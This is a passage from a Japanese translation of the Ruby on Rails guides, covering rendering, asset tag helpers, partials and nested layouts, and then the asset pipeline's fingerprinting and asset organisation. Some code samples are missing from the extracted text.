これを修正する方法のひとつは、renderをredirectに変更することです。
    redirect_to action: :index
上のコードであれば、ブラウザから改めてindexページにリクエストが送信されるので、`index`メソッドのコードが正常に実行されます。
上のコードで1つ残念な点があるとすれば、ブラウザとのやりとりが1往復増えることです。ブラウザから`/books/1`に対してshowアクションが呼び出され、コントローラが本が1冊もないことを検出すると、コントローラはブラウザに対してステータスコード302 (リダイレクト) レスポンスを返し、`/books/`に再度アクセスするようブラウザに指令を出します。ブラウザはこの指令に応じ、このコントローラの`index`アクションを呼び出すためのリクエストを改めてサーバーに送信します。そしてコントローラはこのリクエストを受けてデータベースからすべての蔵書リストを取り出し、indexテンプレートをレンダリングして出力結果をブラウザに送り返すと、ブラウザで蔵書リストが表示されます。
このやりとりの増加による遅延は、小規模なアプリケーションであればおそらく問題になりませんが、遅延が甚だしくなってきた場合にはこの点を改める必要があるかもしれません。
ブラウザとのやりとりを増やさないように工夫した例を以下に示します。
    flash.now[:alert] = "Your book was not found"
    render "index"
上のコードの動作は次のとおりです。指定されたidを持つ本が見つからない場合は、モデル内のすべての蔵書リストを`@books`インスタンス変数に保存します。続いてflashによる警告メッセージを追加し、さらに`index.html.erb`テンプレートを直接レンダリングしてから出力結果をブラウザに送り返します。
### `head`でヘッダのみのレスポンスを生成する
`head`メソッドを使用することで、ヘッダだけで本文 (body) のないレスポンスをブラウザに送信できます。
このメソッド名は`render :nothing`よりも動作を明確に表しています。
`head`メソッドには、HTTPステータスコードを示す多くのシンボルを引数として指定できます ([参照テーブル](#statusオプション) 参照)。
オプションの引数はヘッダ名と値をペアにしたハッシュ値として解釈されます。
たとえば、以下のコードはエラーヘッダーのみのレスポンスを返すことができます。
head :bad_request
上のコードによって以下のヘッダーが生成されます。
HTTP/1.1 400 Bad Request
Date: Sun, 24 Jan 2010 12:15:53 GMT
Content-Type: text/html; charset=utf-8
X-Runtime: 0.013483
以下のように、ヘッダーに別の情報を含めることもできます。
head :created, location: photo_path(@photo)
上のコードの結果は以下のようになります。
HTTP/1.1 201 Created
Date: Sun, 24 Jan 2010 12:16:44 GMT
Location: /photos/1
X-Runtime: 0.083496
レイアウトを構成する
Railsがビューからレスポンスを出力するときには、そのビューには現在のレイアウトも組み込まれます。現在のレイアウトを探索するときのルールは、本ガイドで既に説明したものが使用されます。
レイアウト内では、さまざまな出力の断片を組み合わせて最終的なレスポンス出力を得るための3つのツールを利用できます。
### アセットタグヘルパー
アセットタグヘルパーが提供するメソッドは、フィード、JavaScript、スタイルシート、画像、動画および音声のビューにリンクするHTMLを生成するためのものです。
Railsでは以下の6つのアセットタグヘルパーが利用できます。
これらのタグは、レイアウトや別のビューで使用することもできます。このうち、`auto_discovery_link_tag`、`javascript_include_tag`、`stylesheet_link_tag`はレイアウトの`<head>`セクションで使用するのが普通です。
WARNING: これらのアセットタグヘルパーは、指定の場所にアセットがあるかどうかを _検証しません_ 。
#### `auto_discovery_link_tag`を使用してフィードにリンクする
`auto_discovery_link_tag`ヘルパーを使用すると、多くのブラウザやフィードリーダーでRSSフィードやAtomフィードを検出できるHTMLが生成されます。
このメソッドが受け取れる引数は、リンクの種類 (`:rss`または`:atom`)、url_forで渡されるオプションのハッシュ、およびタグのハッシュです。
<%= auto_discovery_link_tag(:rss, {action: "feed"},
  {title: "RSS Feed"}) %>
`auto_discovery_link_tag`では以下の3つのタグオプションが使用できます。
* `:rel`はリンク内の`rel`値を指定します。
デフォルト値は "alternate" です。
* `:type`はMIMEタイプを明示的に指定したい場合に使用します。
通常、Railsは適切なMIMEタイプを自動的に生成します。
* `:title`はリンクのタイトルを指定します。
デフォルト値は`:type`値を大文字にしたものです ("ATOM" や "RSS" など)。
#### `javascript_include_tag`を使用してJavaScriptファイルにリンクする
`javascript_include_tag`ヘルパーは、指定されたソースごとにHTML `script`タグを返します。
Railsで[アセットパイプライン](asset_pipeline.html) を有効にしている場合、JavaScriptへのリンク先は旧Railsの`public/javascripts`ではなく`/assets/javascripts/`になります。
その後このリンクはアセットパイプラインによって利用可能になります。
Railsアプリケーション内やRailsエンジン内のJavaScriptファイルは、`app/assets`、`lib/assets`、`vendor/assets`のいずれかの場所に置かれます。
これらの置き場所の詳細については、[アセットパイプラインガイドの「アセットの編成」](asset_pipeline.html#アセットの編成) を参照してください。
好みに応じて、ドキュメントルートからの相対フルパスやURLを指定することもできます。
たとえば、`app/assets`、`lib/assets`、または`vendor/assets`の下にある`javascripts`の下にあるJavaScriptファイルにリンクしたい場合は以下のようにします。
<%= javascript_include_tag "main" %>
上のコードにより、以下のような`script`タグが出力されます。
<script src='/assets/main.js'></script>
このアセットへのリクエストは、Sprockets gemによって提供されます。
複数のファイルにアクセスしたい場合 (`app/assets/javascripts/main.js`と`app/assets/javascripts/columns.js`など) は以下のようにします。
<%= javascript_include_tag "main", "columns" %>
`app/assets/javascripts/main.js`と`app/assets/javascripts/photos/columns.js`を含めたい場合は以下のようにします。
<%= javascript_include_tag "main", "/photos/columns" %>
`http://example.com/main.js`を含めるには以下のようにします。
<%= javascript_include_tag "http://example.com/main.js" %>
#### `stylesheet_link_tag`を使用してCSSファイルにリンクする
`stylesheet_link_tag`ヘルパーは、提供されたソースごとにHTML `<link>`タグを返します。
Railsでアセットパイプラインを有効にしている場合、このヘルパーは`/assets/stylesheets/`へのリンクを生成します。
その後このリンクはSprockets gemによって処理されます。
スタイルシートファイルは、`app/assets`、`lib/assets`、または`vendor/assets`のいずれかの場所に置かれます。
ドキュメントルートからの相対フルパスやURLを指定することもできます。
たとえば、`app/assets`、`lib/assets`、または`vendor/assets`の下にある`stylesheets`の下にあるスタイルシートファイルにリンクしたい場合は以下のようにします。
<%= stylesheet_link_tag "main" %>
`app/assets/stylesheets/main.css`と`app/assets/stylesheets/columns.css`を含めるには、以下のようにします。
<%= stylesheet_link_tag "main", "columns" %>
`app/assets/stylesheets/main.css`と`app/assets/stylesheets/photos/columns.css`を含めるには以下のようにします。
<%= stylesheet_link_tag "main", "photos/columns" %>
`http://example.com/main.css`を含めるには以下のようにします。
<%= stylesheet_link_tag "http://example.com/main.css" %>
デフォルトでは、`stylesheet_link_tag`によって作成されるリンクには`media="screen" rel="stylesheet"`という属性が含まれます。
適切なオプション (`:media`, `:rel`) を使用することで、これらのデフォルト値を上書きできます。
<%= stylesheet_link_tag "main_print", media: "print" %>
#### `image_tag`を使用して画像にリンクする
`image_tag`は、特定のファイルを指すHTML `<img />`タグを生成します。
デフォルトでは、ファイルは`public/images`以下から読み込まれます。
WARNING: 画像ファイルの拡張子は省略できません。
<%= image_tag "header.png" %>
好みに応じて、画像ファイルへのパスを直接指定することもできます。
<%= image_tag "icons/delete.gif" %>
ハッシュ形式で与えられたHTMLオプションを追加することもできます。
<%= image_tag "icons/delete.gif", {height: 45} %>
ユーザーがブラウザで画像を非表示にしている場合、alt属性のテキストを表示することができます。
alt属性が明示的に指定されていない場合は、ファイル名がaltテキストとして使用されます。このときファイル名の先頭は大文字になり、拡張子は取り除かれます。
たとえば、以下の2つのimage_tagヘルパーは同じコードを返します。
<%= image_tag "home.gif" %>
<%= image_tag "home.gif", alt: "Home" %>
"{幅}x{高さ}"という形式で特殊なsizeタグを指定することもできます。
<%= image_tag "home.gif", size: "50x20" %>
上の特殊タグ以外にも、`:class`や`:id`や`:name`などの標準的なHTMLオプションを最終的にハッシュにしたものを引数として与えることができます。
<%= image_tag "home.gif", alt: "Go Home",
                          id: "HomeImage",
                          class: "nav_bar" %>
#### `video_tag`を使用してビデオにリンクする
`video_tag`ヘルパーは、指定されたファイルを指すHTML 5 `<video>`タグを生成します。
デフォルトでは、ファイルは`public/videos`から読み込まれます。
<%= video_tag "movie.ogg" %>
上のコードによって以下が生成されます。
<video src="/videos/movie.ogg" />
`image_tag`の場合と同様、絶対パスまたは`public/videos`ディレクトリからの相対パスを指定できます。
さらに、`image_tag`の場合と同様に、`size: "#{幅}x#{高さ}"`オプションを指定することもできます。
ビデオタグでは、`id`や`class`などのHTMLオプションを末尾で自由に指定することもできます。
ビデオタグでは、`<video>` HTMLオプションを以下のようなHTMLオプションハッシュ形式で指定することもできます。
* `poster: "image_name.png"`は、ビデオ再生前にビデオの位置に表示しておきたい画像を指定します。
* `autoplay: true`は、ページの読み込み時にビデオを再生します。
* `loop: true`は、ビデオを最後まで再生し終わったらループします。
* `controls: true`は、ブラウザが提供するビデオ制御機能を使用できるようにします。
* `autobuffer: true`は、ページ読み込み時にすぐ再生できるようにビデオを事前に読み込んでおきます。
`video_tag`にビデオファイルの配列を渡すことで、複数のビデオを再生することもできます。
<%= video_tag ["trailer.ogg", "movie.ogg"] %>
上のコードによって以下が生成されます。
#### `audio_tag`を使用して音声ファイルにリンクする
`audio_tag`は、指定されたファイルを指すHTML 5 `<audio>`タグを生成します。
デフォルトでは、これらのファイルは`public/audios`以下から読み込まれます。
<%= audio_tag "music.mp3" %>
好みに応じて、音声ファイルへのパスを直接指定することもできます。
<%= audio_tag "music/first_song.mp3" %>
`:id`や`:class`などのオプションをハッシュ形式で指定することもできます。
`video_tag`の場合と同様、`audio_tag`にも以下の特殊オプションがあります。
* `autoplay: true`はページ読み込み時に音声ファイルを再生します。
* `controls: true`は、ブラウザが提供する音声ファイル制御機能を使用できるようにします。
* `autobuffer: true`は、ページ読み込み時にすぐ再生できるように音声ファイルを事前に読み込んでおきます。
### `yield`を理解する
`yield`メソッドは、レイアウトのコンテキストでビューを挿入すべき場所を指定するのに使用します。
`yield`の最も単純な使用法は、`yield`を1つだけ使用して、現在レンダリングされているビューのコンテンツ全体をその場所に挿入するというものです。
`yield`を行なう領域を複数使用するレイアウトを作成することもできます。
  <%= yield :head %>
ビューのメイン部分は常に「名前のない」`yield`としてレンダリングされます。
コンテンツを名前付きの`yield`としてレンダリングするには、`content_for`メソッドを使用します。
### `content_for`を使用する
`content_for`メソッドを使用することで、コンテンツを名前付きの`yield`ブロックとしてレイアウトに挿入できます。
たとえば、以下のビューのレンダリング結果は上で紹介したレイアウト内に挿入されます。
<% content_for :head do %>
  <title>A simple page</title>
<p>Hello, Rails!
このページのレンダリング結果がレイアウトに挿入されると、最終的に以下のHTMLが出力されます。
  <p>Hello, Rails!
`content_for`メソッドは、たとえばレイアウトが「サイドバー」や「フッター」などの領域に分かれていて、それらに異なるコンテンツを挿入したいような場合に大変便利です。
あるいは、多くのページで使用する共通のヘッダーがあり、このヘッダーに特定のページでのみJavaScriptやCSSファイルを挿入したい場合にも便利です。
### パーシャルを使用する
部分テンプレートは通常単にパーシャルと呼ばれます。パーシャルは、上とは異なる方法でレンダリング処理を扱いやすい単位に分割するためのしくみです。
パーシャルを使用すると、レスポンスで表示するページの特定部分をレンダリングするためのコードを別ファイルに保存しておくことができます。
#### パーシャルに名前を与える
パーシャルをビューの一部に含めて出力するには、ビュー内で`render`メソッドを使用します。
レンダリング中のビュー内に置かれている上のコードは、その場所で`_menu.html.erb`という名前のファイルをレンダリングします。
上のコードは、`app/views/shared/_menu.html.erb`パーシャルの内容をその場所でレンダリングします。
#### シンプルなビューでパーシャルを使用する
パーシャルの使用方法の1つは、パーシャルを一種のサブルーチンのようにみなすことです。詳細な表示内容をパーシャル化してビューから追い出し、コードを読みやすくします。
例として、以下のようなビューがあるとします。
TIP: すべてのページで共有されているコンテンツであれば、パーシャルをレイアウトで使用することができます。
#### パーシャルレイアウト
ビューにレイアウトがあるのと同様、パーシャルでも独自のレイアウトファイルを使用することができます。
たとえば、以下のようなパーシャルを呼び出すとします。
<%= render partial: "link_area", layout: "graybar" %>
上のコードは、`_link_area.html.erb`という名前のパーシャルを探し、`_graybar.html.erb`という名前のレイアウトを使用してレンダリングを行います。
パーシャルレイアウトは、対応する通常のパーシャルと同様、名前の先頭にアンダースコアを追加する必要があります。そして、パーシャルとそれに対応するパーシャルレイアウトは同じディレクトリに置く必要があります。パーシャルレイアウトは`layouts`フォルダーには置けませんのでご注意ください。
`:layout`などの追加オプションを渡す場合は、`:partial`オプションを明示的に指定する必要がある点にもご注意ください。
#### ローカル変数を渡す
パーシャルにローカル変数を引数として渡し、パーシャルをさらに強力かつ柔軟にすることもできます。
たとえば、newページとeditページの違いがごくわずかしかないのであれば、この手法を使用してコードの重複を解消することができます。
* `new.html.erb`
    <h1>New zone</h1>
    <%= render partial: "form", locals: {zone: @zone} %>
* `edit.html.erb`
    <h1>Editing zone</h1>
* `_form.html.erb`
    <%= form_for(zone) do |f| %>
      <p>
        <b>Zone name</b><br>
        <%= f.text_field :name %>
      </p>
    <p>
        <%= f.submit %>
上の2つのビューでは同じパーシャルがレンダリングされますが、Action Viewのsubmitヘルパーはnewアクションの場合には"Create Zone"を返し、editアクションの場合は"Update Zone"を返します。
どのパーシャルにも、パーシャル名からアンダースコアを取り除いた名前を持つローカル変数が与えられます。
`:object`オプションを使用することで、このローカル変数にオブジェクトを渡すことができます。
<%= render partial: "customer", object: @new_customer %>
上の`customer`パーシャル呼び出しでは、`customer`ローカル変数は親のビューの`@new_customer`変数を指します。
あるモデルのインスタンスをパーシャルとしてレンダリングするのであれば、以下のような略記法を使用できます。
<%= render @customer %>
上のコードでは、`@customer`インスタンス変数に`Customer`モデルのインスタンスが含まれているとします。この場合レンダリングには`_customer.html.erb`パーシャルが使用され、このパーシャルには`customer`ローカル変数が渡されます。この`customer`ローカル変数は、親ビューにある`@customer`インスタンス変数を指します。
#### コレクションをレンダリングする
パーシャルはデータの繰り返し (コレクション) を出力する場合にもきわめて便利です。
`:collection`オプションを使用してパーシャルにコレクションを渡すと、コレクションのメンバごとにパーシャルがレンダリングされて挿入されます。
* `index.html.erb`
    <h1>Products</h1>
    <%= render partial: "product", collection: @products %>
* `_product.html.erb`
    <p>Product Name: <%= product.name %></p>
パーシャルを呼び出す時に指定するコレクションが複数形の場合、パーシャルの個別のインスタンスから、出力するコレクションの個別のメンバにアクセスが行われます。このとき、パーシャル名に基づいた名前を持つ変数が使用されます。
上の場合、パーシャルの名前は`_product`であり、この`_product`パーシャル内で`product`という名前の変数を使用して、出力されるインスタンスを取得できます。
このメソッドには略記法もあります。
`@products`が`product`インスタンスのコレクションであるとすると、`index.html.erb`に以下のように書くことで同じ結果を得られます。
使用するパーシャル名は、コレクション内のモデル名に基いて決定されます。
実は、メンバが一様でない (さまざまな種類のメンバが入り混じった) コレクションにも上の方法を使用できます。この場合、コレクションのメンバに応じて適切なパーシャルが自動的に選択されます。
    <h1>Contacts</h1>
    <%= render [customer1, employee1, customer2, employee2] %>
* `customers/_customer.html.erb`
    <p>Customer: <%= customer.name %></p>
* `employees/_employee.html.erb`
    <p>Employee: <%= employee.name %></p>
上のコードでは、コレクションのメンバに応じて、customerパーシャルまたはemployeeパーシャルが自動的に選択されます。
コレクションが空の場合、`render`はnilを返します。以下のような簡単な方法でもよいので、代わりのコンテンツを表示するようにしましょう。
<%= render(@products) || "There are no products available." 
#### ローカル変数
パーシャル内のローカル変数をカスタマイズしたい場合は、パーシャルの呼び出し時に`:as`オプションを指定します。
<%= render partial: "product", collection: @products, as: :item %>
上のように変更することで、`@products`コレクションのインスタンスに`item`という名前のローカル変数経由でアクセスできます。
`locals: {}`オプションを使用することで、レンダリング中のどのパーシャルにも任意の名前のローカル変数を渡すことができます。
<%= render partial: "product", collection: @products,
           as: :item, locals: {title: "Products Page"} %>
上の場合、`title`という名前のローカル変数に"Products Page"という値が含まれており、パーシャルからこの値にアクセスできます。
TIP: コレクションによって呼び出されるパーシャル内でカウンタ変数を使用することもできます。このカウンタ変数は、コレクション名の後ろに`_counter`を追加した名前になります。
たとえば、パーシャル内で`@products`をレンダリングした回数を`product_counter`変数で参照できます。
ただし、このオプションは`as: :value`オプションと併用できません。
`:spacer_template`オプションを使用することで、メインパーシャルのインスタンスと交互にレンダリングされるセカンドパーシャルを指定することもできます。
上のコードでは、`_product`パーシャルと`_product`パーシャルの合間に`_product_ruler`パーシャル (引数なし) をレンダリングします。
#### コレクションパーシャルレイアウト
コレクションをレンダリングするときにも`:layout`オプションを指定できます。
<%= render partial: "product", collection: @products, layout: "special_layout" %>
このレイアウトは、コレクション内の各項目をレンダリングするたびに一緒にレンダリングされます。
パーシャル内の場合と同様、このレイアウトでも現在のオブジェクトと(オブジェクト名)_counter変数を使用できます。
### ネストしたレイアウトを使用する
特定のコントローラをサポートするために、アプリケーションの標準レイアウトとの違いがごくわずかしかないようなレイアウトを使いたくなることがあります。
ネストしたレイアウト (サブテンプレートと呼ばれることもあります) を使用することで、メインのレイアウトを複製して編集したりせずにこれを実現できます。
例: 
以下の`ApplicationController`レイアウトがあるとします。
* `app/views/layouts/application.html.erb`
    <html>
    <head>
      <title><%= @page_title or "Page Title" %></title>
      <%= stylesheet_link_tag "layout" %>
      <style><%= yield :stylesheets %></style>
    </head>
    <body>
      <div id="top_menu">Top menu items here</div>
      <div id="menu">Menu items here</div>
      <div id="content"><%= content_for?(:content) ? 
yield(:content) : yield %></div>
    </body>
    </html>
`NewsController`によって生成されるページでは、トップメニューを隠して右メニューを追加したいとします。
* `app/views/layouts/news.html.erb`
    <% content_for :stylesheets do %>
      #top_menu {display: none}
      #right_menu {float: right; background-color: yellow; color: black}
      <div id="right_menu">Right menu items here</div>
      <%= content_for?(:news_content) ? 
yield(:news_content) : yield %>
    <%= render template: "layouts/application" %>
以上でおしまいです。
Newsビューで新しいレイアウトが使用されるようになり、トップメニューが隠されて"content" divタグ内に右メニューが新しく追加されました。
これと同じ結果を得られるサブテンプレートの使用法はこの他にもさまざまなものが考えられます。
ネスティングレベルには制限がない点にご注目ください。
たとえばNewsレイアウトで新しいレイアウトを使用するために、`render template: 'layouts/news'`経由で`ActionView::render`メソッドを使用することもできます。
`News`レイアウトをサブテンプレート化するつもりがないのであれば、`content_for?(:news_content) ? yield(:news_content) : yield`を単に`yield`に置き換えれば済みます。
アセットパイプライン
==================
本ガイドでは、アセットパイプライン (asset pipeline) について解説します。
* アセットパイプラインの概要と機能
* アプリケーションのアセットを正しく編成する方法
* アセットパイプラインのメリット
* アセットパイプラインにプリプロセッサを追加する
* アセットをgemパッケージにする
アセットパイプラインについて
アセットパイプラインとは、JavaScriptやCSSのアセットを最小化 (minify: スペースや改行を詰めるなど) または圧縮して連結するためのフレームワークです。
アセットパイプラインでは、CoffeeScriptやSASS、ERBなど他の言語で記述されたアセットを作成する機能を追加することもできます。
技術的には、アセットパイプラインは既にRails 4のコア機能ではありません。フレームワークから分離され、[sprockets-rails](https://github.com/rails/sprockets-rails)というgemに書き出されています。
Railsではデフォルトでアセットパイプラインが有効になっています。
Railsアプリケーションを新規作成する際にアセットパイプラインをオフにしたい場合は、以下のように`--skip-sprockets`オプションを渡します。
rails new appname --skip-sprockets
Rails 4では`sass-rails`、`coffee-rails`、`uglifier` gemが自動的にGemfileに追加されます。Sprocketsはアセット圧縮の際にこれらのgemを使用します。
gem 'sass-rails'
gem 'uglifier'
gem 'coffee-rails'
`--skip-sprockets`オプションを使用すると、Rails 4で`sass-rails`と`uglifier`がGemfileに追加されなくなります。アセットパイプラインを後から有効にしたい場合は、これらのgemもGemfileに追加する必要があります。
同様に、アプリケーション新規作成時に`--skip-sprockets`オプションを指定すると`config/application.rb`ファイルの記述内容がデフォルトから若干異なります。具体的にはsprocket railtieで必要となる記述がコメントアウトされます。
アセットパイプラインを手動で有効にする場合は、これらのコメントアウトも解除する必要があります。
# require "sprockets/railtie"
アセット圧縮方式を指定するには、`production.rb`の該当する設定オプションを設定します。`config.assets.css_compressor`はCSSの圧縮方式、`config.assets.js_compressor`はJavaScriptの圧縮方式をそれぞれ指定します。
config.assets.css_compressor = :yui
NOTE: `sass-rails` gemがGemfileに含まれていれば自動的にCSS圧縮に使用されます。この場合`config.assets.css_compressor`オプションは設定されません。
### 主要な機能
アセットパイプラインの第一の機能はアセットを連結することです。これにより、ブラウザがWebページをレンダリングするためのリクエスト数を減らすことができます。
Webブラウザが同時に処理できるリクエスト数には限りがあるため、同時リクエスト数を減らすことができればその分読み込みが高速になります。
SprocketsはすべてのJavaScriptファイルを1つのマスター`.js`ファイルに連結し、すべてのCSSファイルを1つのマスター`.css`ファイルに連結します。
本ガイドで後述するように、アセットファイルをグループ化する方法は自由にカスタマイズできます。
production環境では、アセットファイル名にMD5フィンガープリントを挿入し、アセットファイルがWebブラウザでキャッシュされるようにしています。
このフィンガープリントを変更することでブラウザでキャッシュされていた既存のアセットを無効にすることができます。フィンガープリントの変更は、アセットファイルの内容が変更された時に自動的に行われます。
アセットパイプラインのもうひとつの機能はアセットの最小化 (一種の圧縮) です。
CSSファイルの最小化は、ホワイトスペースとコメントを削除することによって行われます。
JavaScriptの最小化プロセスはもう少し複雑です。
最小化方法はビルトインのオプションから選んだり、独自に指定したりすることができます。
アセットパイプラインの第3の機能は、より高級な言語を使用したコーディングのサポートです。これらの言語で記述されたコードはプリコンパイルされ、実際のアセットになります。
デフォルトでサポートされている言語は、CSSに代わるSASS、JavaScriptに代わるCoffeeScript、CSS/JavaScriptに代わるERBです。
### フィンガープリントと注意点
アセットファイル名で使用されるフィンガープリントは、アセットファイルの内容に応じて変わります。
アセットファイルの内容が少しでも変わると、アセットファイル名も必ずそれに応じて変わります (訳注: MD5の性質により、異なるファイルからたまたま同じフィンガープリントが生成されることはほぼありません)。
変更されていないファイルやめったに変更されないファイルがある場合、フィンガープリントも変化しないので、ファイルの内容が完全に同一であることが容易に確認できます。これはサーバーやデプロイ日が異なっていても有効です。
アセットファイル名は内容が変わると必ず変化するので、CDN、ISP、ネットワーク機器、Webブラウザなどあらゆる場面で有効なキャッシュをHTTPヘッダに設定することができます。
ファイルの内容が更新されると、フィンガープリントも更新されます。
これにより、リモートクライアントは (訳注: 既存のキャッシュを使用せずに) コンテンツの新しいコピーをサーバーにリクエストします。
この手法を一般に _キャッシュ破棄 (cache busting)_ と呼びます。
Sprocketsがフィンガープリントを使用する際には、ファイルの内容をハッシュ化したものをファイル名 (通常は末尾) に追加します。
たとえば、`global.css`というCSSファイル名は以下のようになります。
global-908e25f4bf641868d8683022a5b62f54.css
これはRailsのアセットパイプラインの戦略として採用されています。
以前のRailsでは、ビルトインのヘルパーにリンクされているすべてのアセットに日付ベースのクエリ文字列を追加するという戦略が使用されていました。
当時のソースで生成されたコードは以下のようになります。
このクエリ文字列ベースの戦略には多くの問題点があります。
**クエリパラメータ以外にファイル名に違いのないコンテンツは確実にキャッシュされないことがある**
    [Steve Soudersのブログ記事](http://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/)によると、「キャッシュされる可能性のあるリソースにクエリ文字列でアクセスするのは避けること」が推奨されています。
Steveは、5%から20%ものリクエストがキャッシュされていないことに気付きました。
クエリ文字列は、キャッシュ無効化が発生する一部のCDNでは役に立ちません。
**マルチサーバー環境でファイル名が異なってしまうことがある
    Rails 2.xのデフォルトのクエリ文字列はファイルの更新日付に基いていました。
このアセットをサーバークラスタにデプロイすると、サーバー間でファイルのタイムスタンプが同じになる保証がないため、リクエストを受けるサーバーが変わるたびに値が異なってしまいます。
**キャッシュの無効化が過剰に発生する**
    コードリリース時のデプロイが行われると、アセットに変更があるかどうかにかかわらず _すべての_ ファイルのmtime (最後に更新された時刻) が変更されてしまいます。このため、アセットに変更がなくてもWebブラウザを含むあらゆるリモートクライアントで強制的にアセットが再取得されてしまいます。
フィンガープリントが導入されたことによって上述のクエリ文字列による問題点が解決され、アセットの内容が同じであればファイル名も常に同じになるようになりました。
フィンガープリントはproduction環境ではデフォルトでオンになっており、それ以外の環境ではオフになります。
設定ファイルで`config.assets.digest`オプションを使用してフィンガープリントのオン/オフを制御できます。
詳細については以下を参照してください。
* [キャッシュの最適化](http://code.google.com/speed/page-speed/docs/caching.html)
* [ファイル名の変更にクエリ文字列を使用してはいけない理由](http://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/)
アセットパイプラインの使用方法
以前のRailsでは、すべてのアセットは`public`ディレクトリの下の`images`、`javascripts`、`stylesheets`などのサブフォルダに置かれました。
アセットパイプライン導入後は、`app/assets`ディレクトリがアセットの置き場所として推奨されています。
このディレクトリに置かれたファイルはSprocketsミドルウェアによってサポートされます。
アセットは引き続き`public`ディレクトリ以下に置くことも可能です。
プリプロセスが必要なファイルは`app/assets`ディレクトリの下に置く必要があります。
Railsは、productionモードではデフォルトで`public/assets`ファイルをプリコンパイルします。
このプリコンパイルされたファイルがWebサーバーによって静的なアセットとして扱われます。
`app/assets`に置かれたファイルがそのままの形でproduction環境で使用されることは決してありません。
### コントローラ固有のアセット
Railsでscaffoldやコントローラを生成すると、JavaScriptファイル (`coffee-rails` gemが`Gemfile`で有効になっている場合はCoffeeScript) とCSS (`sass-rails` gemが`Gemfile`で有効になっている場合はSCSS) もそのコントローラ用に生成されます。
scaffold生成時には、さらにscaffolds.css (`sass-rails` gemが`Gemfile`で有効になっている場合はscaffolds.css.scss) も生成されます。
たとえば`ProjectsController`を生成すると、`app/assets/javascripts/projects.js.coffee`ファイルと`app/assets/stylesheets/projects.css.scss`ファイルが新しく作成されます。
`require_tree`ディレクティブを使用すると、これらのファイルを即座にアプリケーションから利用できます。
require_treeの詳細については[マニフェストファイルとディレクティブ](#マニフェストファイルとディレクティブ)を参照してください。
関連するコントローラで以下のコードを使用することで、コントローラ固有のスタイルシートやJavaScriptファイルをそのコントローラだけで使用できます。
`<%= javascript_include_tag params[:controller] %>` または `<%= stylesheet_link_tag params[:controller] %>`
上のコードを使用する際は、`require_tree`ディレクティブを使用していないことを必ず確認してください。`require_tree`と併用すると、アセットが2回以上インクルードされてしまいます。
WARNING: アセットのプリコンパイルを使用する場合、ページが読み込まれるたびにコントローラのアセットがプリコンパイルされるようにしておく必要があります。
デフォルトでは、.coffeeファイルと.scssファイルは自動ではプリコンパイルされません。
プリコンパイルの動作の詳細については、[アセットをプリコンパイルする](#アセットをプリコンパイルする)を参照してください。
NOTE: CoffeeScriptを使用するには、ExecJSがランタイムでサポートされている必要があります。
Mac OS XまたはWindowsを使用している場合は、OSにJavaScriptランタイムをインストールしてください。
`config/application.rb`設定に以下を追加することで、コントローラ固有のアセットファイル生成を止めることもできます。
config.generators do |g|
  g.assets false
### アセットの編成
パイプラインのアセットは、アプリケーション内の`app/assets`、`lib/assets`、`vendor/assets`の3つのディレクトリのいずれかに置くことができます。
* `app/assets`は、カスタム画像ファイル、JavaScript、スタイルシートなど、アプリケーション自身が保有するアセットの置き場所です。
* `lib/assets`は、1つのアプリケーションの範疇に収まらないライブラリのコードや、複数のアプリケーションで共有されるライブラリのコードを置く場所です。
* `vendor/assets`は、JavaScriptプラグインやCSSフレームワークなど、外部の団体などによって所有されているアセットの置き場所です。
WARNING: Rails 3からのアップグレードを行なう際には、`lib/assets`と`vendor/assets`の下に置かれているアセットがRails 4ではアプリケーションのマニフェストによってインクルードされて利用可能になること、しかしプリコンパイル配列の一部には含まれなくなることを考慮に入れてください。
ガイダンスについては[アセットをプリコンパイルする](#アセットをプリコンパイルする)を参照してください。
#### パスの検索
ファイルがマニフェストやヘルパーから参照される場合、Sprocketsはデフォルトのアセットの置き場所である3つのディレクトリからファイルを探します。
3つのディレクトリとは、`app/assets`の下にある`images`、`javascripts`、`stylesheets`ディレクトリです。ただしこれらのサブディレクトリは特殊なものではなく、実際には`assets/*`以下のすべてのパスが検索対象になります。
以下のファイルを例に説明します。
app/assets/javascripts/home.js
lib/assets/javascripts/moovinator.js
vendor/assets/javascripts/slider.js
vendor/assets/somepackage/phonebox.js
上のファイルはマニフェスト内で以下のように参照されます。
```js
//= require home
//= require moovinator
//= require slider
//= require phonebox
サブディレクトリ内のアセットにもアクセスできます。
app/assets/javascripts/sub/something.js
上のファイルは以下のように参照されます。
//= require sub/something
検索パスを調べるには、Railsコンソールで`Rails.application.config.assets.paths`を調べます。
`config/application.rb`に記述することで、標準の`assets/*`に加えて追加の (fully qualified) パスをパイプラインに追加することができます。
以下の例で説明します。
config.assets.paths << Rails.root.join("lib", "videoplayer", "flash")
パスの探索は、検索パスでの出現順で行われます。
デフォルトでは`app/assets`の検索が優先されるので、対応するパスが`lib`や`vendor`にある場合はマスクされます。
#### indexファイルを使用する
Sprocketsでは、`index`という名前のファイル (および関連する拡張子) を特殊な目的に使用します。
たとえば、たくさんのモジュールがあるjQueryライブラリを使用していて、それらが`lib/assets/javascripts/library_name`に保存されているとします。この`lib/assets/javascripts/library_name/index.js`ファイルはそのライブラリ内のすべてのファイルで利用できるマニフェストとして機能します。
このファイルには必要なファイルをすべて順に記述するか、あるいは単に`require_tree`と記述します。
一般に、このライブラリはアプリケーションマニフェストに以下のように記述することでアクセスできます。
//= require library_name
このように記述することで、他でインクルードする前に関連するコードをグループ化できるようになり、記述が簡潔になり保守がしやすくなります。
### アセットにリンクするコードを書く
Sprocketsはアセットにアクセスするためのメソッドを特に追加しません。従来同様`javascript_include_tag`と`stylesheet_link_tag`を使用します。
<%= stylesheet_link_tag "application", media: "all" %>
<%= javascript_include_tag "application" %>
Rails 4から同梱されるようになったturbolinks gemを使用している場合、'data-turbolinks-track'オプションが利用できます。これはアセットが更新されてページに読み込まれたかどうかをturbolinksがチェックします。
<%= stylesheet_link_tag "application", media: "all", "data-turbolinks-track" => true %>
<%= javascript_include_tag "application", "data-turbolinks-track" => true %>
通常のビューでは以下のような方法で`public/assets/images`ディレクトリの画像にアクセスできます。
<%= image_tag "rails.png" %>
パイプラインが有効でかつ現在の環境で無効になっていない場合、このファイルはSprocketsによって扱われます。
ファイルが`public/assets/rails.png`に置かれている場合、Webサーバーによって扱われます。
`public/assets/rails-af27b6a414e6da00003503148be9b409.png`など、ファイル名にMD5ハッシュを含むファイルへのリクエストについても同様に扱われます。
ハッシュの生成法については、本ガイドの[production環境の場合](#production環境の場合)で後述します。
